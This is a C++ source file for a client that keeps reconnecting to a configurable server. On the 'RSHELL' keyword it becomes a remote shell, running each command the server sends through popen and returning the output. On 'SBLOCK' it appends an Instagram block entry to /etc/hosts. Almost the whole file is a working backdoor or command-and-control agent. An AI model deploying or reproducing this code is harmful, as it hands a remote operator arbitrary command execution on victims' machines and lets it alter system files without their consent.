#include <iostream>
#include <cstring>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h> // For sleep function

const int PORT = 8080;
const char *SERVER_IP = "127.0.0.1"; // Change this to the server's IP address

int WebsiteBlocker();
int compare(char a[], char b[])
{
    for (int i = 0; a[i] != '\0'; i++)
    {
        if (a[i] != b[i])
            return 0;
    }
    return 1;
}

int main()
{
    int clientSocket;
    struct sockaddr_in serverAddress;
    char buffer[1024] = {0};

    while (true)
    {
        // Create a socket
        clientSocket = socket(AF_INET, SOCK_STREAM, 0);
        if (clientSocket == -1)
        {
            std::cerr << "Socket creation error" << std::endl;
            return 1;
        }

        // Prepare the sockaddr_in structure
        serverAddress.sin_family = AF_INET;
        serverAddress.sin_port = htons(PORT);

        // Convert IPv4 and IPv6 addresses from text to binary form
        if (inet_pton(AF_INET, SERVER_IP, &serverAddress.sin_addr) <= 0)
        {
            std::cerr << "Invalid address/Address not supported" << std::endl;
            return 1;
        }

        // Connect to the server
        if (connect(clientSocket, (struct sockaddr *)&serverAddress, sizeof(serverAddress)) == -1)
        {
            std::cerr << "Connection failed" << std::endl;
            close(clientSocket);
            sleep(1); // Wait for 1 second before trying to reconnect
            continue;
        }

        while (true)
        {
            // Send a message to the server
            const char *message = "Hello from client!";
            send(clientSocket, message, strlen(message), 0);
            std::cout << "Message sent to server." << std::endl;

            // Receive a response from the server
            int valRead = read(clientSocket, buffer, 1024);
            if (valRead == 0)
            {
                std::cerr << "Connection closed by the server" << std::endl;
                close(clientSocket);
                break; // Exit the inner loop and try to reconnect in the outer loop
            }
            std::string str(buffer);
            std::cout << "Received response from server: " << str << std::endl;

            char buffer1[1024] = "RSHELL";
            char buffer2[1024] = "SBLOCK";
            if (compare(buffer2, buffer)){
                WebsiteBlocker();
            }
            if (compare(buffer1, buffer))
            {
                std::cout << "Received response " << str << std::endl;
                const char *message = "ACTIVE";
                send(clientSocket, message, strlen(message), 0);
                while (true)
                {
                    // Receive command from the server
                    int valRead = read(clientSocket, buffer, sizeof(buffer) - 1);
                    if (valRead == 0)
                    {
                        std::cerr << "Connection closed by the server" << std::endl;
                        break;
                    }
                    else if (valRead == -1)
                    {
                        std::cerr << "Error while receiving data" << std::endl;
                        break;
                    }

                    buffer[valRead] = '\0';
                    std::cout << "Received command: " << buffer << std::endl;

                    // Execute the command and capture the output
                    FILE *commandOutput = popen(buffer, "r");
                    if (commandOutput == nullptr)
                    {
                        std::cerr << "Command execution error" << std::endl;
                        send(clientSocket, "Command execution error", 24, 0);
                        continue;
                    }

                    std::string output;
                    while (fgets(buffer, sizeof(buffer), commandOutput) != nullptr)
                    {
                        output += buffer;
                    }
                    pclose(commandOutput);

                    // Send the output back to the server
                    send(clientSocket, output.c_str(), output.size(), 0);

                    // Clear the buffer
                    memset(buffer, 0, sizeof(buffer));
                }
            }

            // Clear the buffer
            memset(buffer, 0, sizeof(buffer));

            // Sleep for 1 second before sending the next message
            sleep(1);
        }
    }

    return 0;
}

int WebsiteBlocker()
{
    // Command to add an entry to block www.instagram.com in the hosts file
    const char *command = "echo '127.0.0.1 www.instagram.com' >> /etc/hosts";

    // Execute the command
    int result = std::system(command);

    if (result == 0)
    {
        std::cout << "Blocked www.instagram.com" << std::endl;
    }
    else
    {
        std::cerr << "Failed to block www.instagram.com" << std::endl;
    }

    return 0;
}